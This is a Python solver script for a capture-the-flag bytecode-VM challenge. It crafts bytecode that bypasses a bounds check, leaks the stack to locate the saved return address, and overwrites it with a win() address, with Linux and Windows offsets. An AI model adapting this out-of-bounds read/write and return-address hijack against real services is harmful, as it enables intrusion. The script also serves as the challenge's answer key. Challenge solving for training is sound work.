#!/usr/bin/env python3
import socket
import struct
import sys
import argparse

# --- VM Opcodes (must match chal.c) ---
OP_LI    = 3
OP_LOAD  = 4
OP_STORE = 5
OP_JLT   = 8
OP_INPUT = 9
OP_HALT  = 10

def asm_inst(op, dst, src1, src2, imm):
    return struct.pack("<BBBBq", op, dst, src1, src2, imm)

# --- Bytecode Generation ---
def make_leak_payload():
    code  = asm_inst(OP_LI, 1, 0, 0, 256)     # r1 = 256
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)     # r0 = input(idx)
    code += asm_inst(OP_JLT, 0, 1, 0, 4)       # if r0 < 256 goto HALT
    code += asm_inst(OP_LOAD, 2, 0, 0, 0)      # r2 = data_mem[r0]
    code += asm_inst(OP_HALT, 0, 0, 0, 0)
    return code

def make_exploit_payload(win_addr):
    """Overwrite saved RIP with win() address. Only writes one slot."""
    code  = asm_inst(OP_LI, 1, 0, 0, 256)
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)           # r0 = rip_index
    code += asm_inst(OP_LI, 2, 0, 0, win_addr)       # r2 = win
    code += asm_inst(OP_JLT, 0, 1, 0, 5)             # bypass bounds check
    code += asm_inst(OP_STORE, 0, 2, 0, 0)            # data_mem[rip_index] = win
    code += asm_inst(OP_HALT, 0, 0, 0, 0)
    return code

def recv_until(s, pattern, timeout=3):
    """Receive until pattern is found or timeout."""
    s.settimeout(timeout)
    buf = b""
    try:
        while pattern not in buf:
            chunk = s.recv(1)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    finally:
        s.settimeout(None)
    return buf

def query_server(host, port, payload, inputs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    
    # Receive banner and count prompt
    recv_until(s, b"Enter Telemetry Bytecode count:", timeout=5)
    
    # Send bytecode instruction count
    count = len(payload) // 12
    s.sendall(f"{count}\n".encode())
    
    # Receive bytecode stream prompt
    recv_until(s, b"bytecode payload:\n", timeout=5)
    
    # Send bytecode bytes
    s.sendall(payload)
    
    # Process sequential inputs
    buf = b""
    for inp in inputs:
        buf += recv_until(s, b"INPUT>", timeout=3)
        s.sendall(f"{inp}\n".encode())
        
    # Read remaining stdout with timeout
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
        
    s.close()
    return buf.decode(errors="ignore")

def main():
    parser = argparse.ArgumentParser(description="Pure Python Socket Solver for Solaris VM")
    parser.add_argument("host", nargs="?", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=1337, help="Target port (default: 1337)")
    parser.add_argument("--win-pe", action="store_true", help="Use local Windows PE x64 offsets instead of Linux ELF")
    args = parser.parse_args()

    # --- Target Segment Configuration ---
    if args.win_pe:
        # Windows PE compiled with MSYS2 GCC and --disable-dynamicbase (no ASLR)
        # ImageBase = 0x140000000, .text = 0x140001000-0x140012450
        # win() = 0x1400014d4, but we jump to win+1 = 0x1400014d5 to skip 'push rbp'
        # This fixes stack alignment: returning from run_vm leaves RSP=16N (not 16N-8),
        # so skipping push rbp keeps correct alignment for fopen/printf calls.
        win_addr = 0x1400014d5  # win+1: skip push rbp for alignment
        ret_gadget = 0x140001000
        code_min, code_max = 0x140001000, 0x140012FFF
        print("[*] Configured for local Windows PE target (chal.exe)")
    else:
        # Standard Linux ELF x86_64 target (matches solve.py)
        # Using win+1 to fix stack alignment since we use the single-write payload
        # which skips the ret gadget.
        win_addr = 0x401312  # win+1: skip push rbp
        ret_gadget = 0x40101a
        code_min, code_max = 0x400000, 0x4fffff
        print("[*] Configured for Linux ELF target (chal)")

    print(f"[*] win = {hex(win_addr)}")
    print(f"[*] ret = {hex(ret_gadget)}")
    print(f"[*] Connecting to {args.host}:{args.port}...")

    # --- Stage 1: Leak Stack to find saved RIP index ---
    print("[*] Stage 1: Scanning stack index 256 to 340 for code pointer...")
    leak_code = make_leak_payload()
    saved_rip_index = None

    for idx in range(256, 340):
        try:
            res = query_server(args.host, args.port, leak_code, [idx])
            for line in res.splitlines():
                if "r2:" in line:
                    val = int(line.split()[1], 16)
                    if val != 0:
                        print(f"  data_mem[{idx}] = {hex(val)}")
                    # Check if leaked value lies within the code segment
                    if code_min <= val <= code_max:
                        saved_rip_index = idx
                        print(f"[+] Found saved RIP pointer at data_mem[{idx}] = {hex(val)}")
                        break
        except Exception as e:
            print(f"  Index {idx} query failed: {e}")
        if saved_rip_index is not None:
            break

    if saved_rip_index is None:
        print("[-] Error: Could not find saved RIP pointer.")
        print("[-] On Windows, ensure chal.exe is compiled with: gcc -o chal.exe chal.c \"-Wl,--disable-dynamicbase\" -no-pie")
        sys.exit(1)

    # --- Stage 2: Overwrite saved RIP with win ---
    print(f"[*] Stage 2: Injecting exploit payload at data_mem[{saved_rip_index}]...")
    exploit_code = make_exploit_payload(win_addr)
    res = query_server(args.host, args.port, exploit_code, [saved_rip_index])

    print("\n[+] Exploitation output:")
    print(res)

if __name__ == "__main__":
    main()
